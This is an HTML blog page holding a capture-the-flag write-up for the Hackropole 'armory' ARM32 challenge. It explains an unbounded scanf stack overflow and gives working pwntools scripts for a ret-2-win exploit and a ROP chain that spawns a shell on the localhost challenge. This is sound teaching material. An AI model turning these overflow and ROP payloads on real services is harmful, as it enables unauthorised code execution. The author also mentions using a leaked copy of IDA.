@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>PWN: Basic ARM Stack Buffer Overflow :: yocvito website</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A basic binary exploitation challenge on ARM" />
+<meta name="keywords" content="write-up, pwn, ret-2-win, arm, linux" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/pwn_hackropole-armory/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="yocvito" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PWN: Basic ARM Stack Buffer Overflow">
+<meta property="og:description" content="A basic binary exploitation challenge on ARM" />
+<meta property="og:url" content="//localhost:1313/posts/pwn_hackropole-armory/" />
+<meta property="og:site_name" content="yocvito website" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-10-29 15:17:22 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    yocvito
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume">Resume / CV</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume" >Resume / CV</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/pwn_hackropole-armory/">PWN: Basic ARM Stack Buffer Overflow</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-10-29</time><span class="post-author">yocvito</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/ret-2-win/">ret-2-win</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/arm/">arm</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#analysis">Analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#ropchain-based-exploit">ROPChain based exploit</a>
+          <ul>
+            <li><a href="#finding-relevant-gadgets">Finding relevant gadgets</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="pwn-hackropole---armory">PWN: Hackropole - Armory<a href="#pwn-hackropole---armory" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This is challenge for training basic buffer overflows on ARM architecture. It was found on the <a href="https://hackropole.fr/fr/challenges/pwn/fcsc2019-pwn-armory/">Hackropole</a> website.</p>
+<h2 id="challenge-description">Challenge Description<a href="#challenge-description" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>You have a docker container running the challenge binary on <code>localhost:4000</code>.</p>
+<p>When you connect to it with a network utility like <code>socat</code>, you can see it ask for an input name and then display an hello message.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ socat tcp:localhost:4000 -
+</span></span><span style="display:flex;"><span>Hello, what<span style="color:#960050;background-color:#1e0010">&#39;</span>s your name?
+</span></span><span style="display:flex;"><span>user
+</span></span><span style="display:flex;"><span>Hello user!
+</span></span></code></pre></div><p>The binary running is an ARM32 ELF executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file armory
+</span></span><span style="display:flex;"><span>armory: ELF 32-bit LSB executable, ARM, EABI5 version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>aaa2d5ba6d3a6cf3958eb9073e673795c2f1e24e, not stripped
+</span></span></code></pre></div><p>We can look at the binary protections with <code>checksec</code> from <code>pwntools</code> suite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec armory
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/path/to/armory&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       arm-32-little
+</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x10000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><p>The binary has not actual protection other than <code>NX</code> or <code>RELRO</code>, meaning we cannot perform shellcode injection nor GOT overwrite.</p>
+<h2 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We analyze the binary with IDA Pro (I&rsquo;m using the IDA 9 leak you can find on internet archive).</p>
+<p>The <code>main</code> function is quite simple, it reads a name from the user and then prints a message.</p>
+<p><img alt="main function" src="/img/pwn-hackropole_armory/main.png"></p>
+<p>The <code>scanf</code> call on line 7 doesn&rsquo;t bound the size of the retrieved input, allowing the user to inject more bytes than the <code>input</code> buffer can hold. Causing a buffer overflow and potentially allowing to execute arbitrary code.</p>
+<blockquote>
+<p>It could have been avoided by using <code>scanf(&quot;%63s&quot;, input)</code> which limit the number of written bytes.</p>
+</blockquote>
+<p>In order to exploit this code, we want to redirect the program execution and spawn a shell. To do so, we need to control the return address of the function and make it point to malicious code.</p>
+<p>When the <code>main</code> function returns, the <code>LR</code> register will contains our own crafted address, eventually executing attacker controlled code.</p>
+<p>As we cannot directly inject shellcode, the idea is to either find a function in the binary that can be control to spawn a shell or use a <strong>ROPChain</strong> to call <code>system(&quot;/bin/sh&quot;)</code>.</p>
+<p>Luckily, the binary contains an <code>evil</code> function spawning a shell. We know the binary hasn&rsquo;t <code>PIE</code> enabled, thus we can directly call this function without needing a leak from the program.</p>
+<p><img alt="evil function" src="/img/pwn-hackropole_armory/evil.png"></p>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We have found a vulnerability in the binary and now we want to exploit it. We already have unveiled the <code>evil</code> function that spawns a shell and will craft an exploit to call it.</p>
+<p>We first need to find the offset between the <code>input</code> buffer start and the return address. In the disassembly view above, we can look at the function prologue to discover this.</p>
+<p>The function is pushing <code>FP</code> and <code>LR</code> registers on the stack and then allocates 0x40 (64) bytes. Thus the offset from <code>input</code> to <code>LR</code> is 0x44 (68).</p>
+<blockquote>
+<p>Remember order of <code>PUSH</code> instruction when loading mutliple values onto the stack. The most significant register (right) is pushed first.</p>
+</blockquote>
+<p><strong>Stack Layout of main:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>0xffff:   LR            &lt;-- FP
+</span></span><span style="display:flex;"><span>0xfffb:   FP    
+</span></span><span style="display:flex;"><span>0xfff8:   input[60:64]
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0xffbb:   input[0:4]    &lt;-- SP
+</span></span></code></pre></div><p>We can now craft the exploit code for interacting with the binary. We will use <code>pwntools</code> to connect to the remote port, craft and send the payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0001052c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;host&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The host to connect to&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port to connect to&#34;</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x44</span> <span style="color:#f92672">+</span> p32(evil_ea))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>By running the exploit script, we can see the exploitation was successful.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py localhost <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to localhost on port 4000: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Hello, what<span style="color:#960050;background-color:#1e0010">&#39;</span>s your name?
+</span></span><span style="display:flex;"><span>Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>01!
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>ctf
+</span></span><span style="display:flex;"><span>$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2023</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">13</span> 07:52 ..
+</span></span><span style="display:flex;"><span>-r-x------ <span style="color:#ae81ff">1</span> ctf  ctf  <span style="color:#ae81ff">8316</span> Apr <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2023</span> armory
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> ctf  ctf    <span style="color:#ae81ff">47</span> Apr <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2023</span> flag
+</span></span><span style="display:flex;"><span>-r-x------ <span style="color:#ae81ff">1</span> ctf  ctf    <span style="color:#ae81ff">56</span> Apr <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2023</span> run.sh
+</span></span><span style="display:flex;"><span>$ cat flag
+</span></span><span style="display:flex;"><span>ECSC<span style="color:#f92672">{</span>__REDACTED__<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p>We are now very happy to got it work, but we did not really improved our ARM skills here&hellip;
+Thus we will try to exploit it using ROP to mess a bit more with ARM exploitation.</p>
+<h3 id="ropchain-based-exploit">ROPChain based exploit<a href="#ropchain-based-exploit" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>What we need is to contruct a ROPChain (look at <a href="http://phrack.org/issues/58/4.html#article">this</a> if you don&rsquo;t know about ROPs). The binary isn&rsquo;t designed to be exploited using ROP thus the CTF author didn&rsquo;t put specific gadgets in the binary. It will be a bit more difficult to chain gadgets for calling <code>system(&quot;/bin/dash&quot;)</code>.</p>
+<p>In order to call a function using <strong>ret-2-libc</strong>, we need to set up the CPU registers as if the function was called normally, and finally return to the function.</p>
+<p>Our target function is <code>system</code> which takes 1 argument, a pointer to a string representing the command to run. In ARM32, arguments are passed through registers <code>R0-R3</code>  and then onto the stack. So if we can set the <code>R0</code> register to the address of the string <code>/bin/dash</code> and then makes <code>LR</code> points to the <code>system</code> function, we can spawn a shell.</p>
+<p>Our ROPChain should look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>+0:   @pop_r0_lr   &lt;-- LR (when returning from main)
+</span></span><span style="display:flex;"><span>+4:   @bin_sh
+</span></span><span style="display:flex;"><span>+8:   @system
+</span></span></code></pre></div><h4 id="finding-relevant-gadgets">Finding relevant gadgets<a href="#finding-relevant-gadgets" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>We can enumerate the binary gadgets using <code>ROPgadget</code> (output has been reduced for clarity):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ROPgadget --binary<span style="color:#f92672">=</span>armory
+</span></span><span style="display:flex;"><span>Gadgets information
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
+</span></span><span style="display:flex;"><span>0x00010530 : add fp, sp, <span style="color:#75715e">#4 ; ldr r3, [pc, #0x18] ; add r3, pc, r3 ; mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr</span>
+</span></span><span style="display:flex;"><span>0x0001049c : add r1, r1, r1, lsr <span style="color:#75715e">#31 ; asrs r1, r1, #1 ; bxeq lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x00010380 : pop <span style="color:#f92672">{</span>r3, lr<span style="color:#f92672">}</span> ; bx lr
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x000105b8 : mov r0, r3 ; sub sp, fp, <span style="color:#75715e">#4 ; pop {fp, lr} ; bx lr</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x00010464 : sub r3, r3, r0 ; cmp r3, <span style="color:#75715e">#6 ; bxls lr ; ldr r3, [pc, #0x10] ; cmp r3, #0 ; bxeq lr ; bx r3</span>
+</span></span><span style="display:flex;"><span>0x00010548 : sub sp, fp, <span style="color:#75715e">#4 ; pop {fp, lr} ; bx lr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">94</span>
+</span></span></code></pre></div><p>There is no obvious gadgets for setting up <code>r0</code> to what we want. We can eventually branch <code>0x00010380 : pop {r3, lr} ; bx lr</code> with <code>0x000105b8 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr</code> but <code>sp</code> is modified and thus, the stack layout will be undefined, making our exploit potentially fail.</p>
+<p>What we can still do to demonstrate ROP on ARM is, using the gadget that call <code>system</code> in the <code>evil</code> function, discard the loading of the <code>&quot;/bin/dash&quot;</code> string into <code>r3</code> and use the gadget at <code>0x10380</code> to load it manually with ROP.</p>
+<p><img alt="evil function dissasembly" src="/img/pwn-hackropole_armory/evil-disass.png"></p>
+<p>Our ROPChain will then look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>+0: 0x00010380  ; @g_mov_r0_r3
+</span></span><span style="display:flex;"><span>+4: 0x00010650  ; @/bin/dash (retrieved in IDA)
+</span></span><span style="display:flex;"><span>+8: 0x0001053C  ; @evil_system_stub
+</span></span></code></pre></div><blockquote>
+<p>One thing to notice is that <code>scanf</code> doesn&rsquo;t abort on <code>\x00</code> and allows us to write zeroes in the middle of our ROPchain. We can see in scanf documentation that &ldquo;The input string stops at white space or at the maximum field width, whichever occurs first.&rdquo;</p>
+</blockquote>
+<p>We can modify our exploit script to handle the simple and rop-based exploits:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0001052c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subcommands <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;subcommand&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    simple_parser <span style="color:#f92672">=</span> subcommands<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;simple&#34;</span>)
+</span></span><span style="display:flex;"><span>    rop_parser <span style="color:#f92672">=</span> subcommands<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;rop&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rop_parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-b&#34;</span>, <span style="color:#e6db74">&#34;--binary&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The binary to exploit and retrieve gadgets from&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;host&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The host to connect to&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port to connect to&#34;</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>subcommand <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;simple&#34;</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Exploiting with RET-2-WIN&#34;</span>)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x44</span> <span style="color:#f92672">+</span> p32(evil_ea)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>subcommand <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;rop&#34;</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Exploiting with ROP&#34;</span>)
+</span></span><span style="display:flex;"><span>        bin <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
+</span></span><span style="display:flex;"><span>        binsh_ea <span style="color:#f92672">=</span> next(bin<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/dash</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>        g_evil_system_stub <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0001053C</span> <span style="color:#75715e"># 0x0001053c : mov r0, r3 ; bl #0x103cc ; mov r0, r0 ; sub sp, fp, #4 ; pop {fp, lr} ; bx lr</span>
+</span></span><span style="display:flex;"><span>        g_mov_r0_r3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00010380</span> <span style="color:#75715e"># 0x0001037c : pop {r3, lr} ; bx lr </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x44</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r3)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(binsh_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_evil_system_stub)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Then we can exploit the remote service using ROP !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py rop  -b ./armory localhost <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>Exploiting with ROP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/path/to/armory&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       arm-32-little
+</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x10000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to localhost on port 4000: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Hello, what<span style="color:#960050;background-color:#1e0010">&#39;</span>s your name?
+</span></span><span style="display:flex;"><span>Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>01!
+</span></span><span style="display:flex;"><span>$ cat flag
+</span></span><span style="display:flex;"><span>ECSC<span style="color:#f92672">{</span>__REDACTED__<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>One remaining issue is that we cannot call <code>exit</code> or <code>abort</code> at the end of our exploit because the last gadget is making the program crash by branching to an invalid address.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/pwn_hackropole-pwnduino/" class="button inline prev">
+        PWN: AVR exploitation
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/linux-rootkit/" class="button inline next">
+        MalDev: Linux Rootkit
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
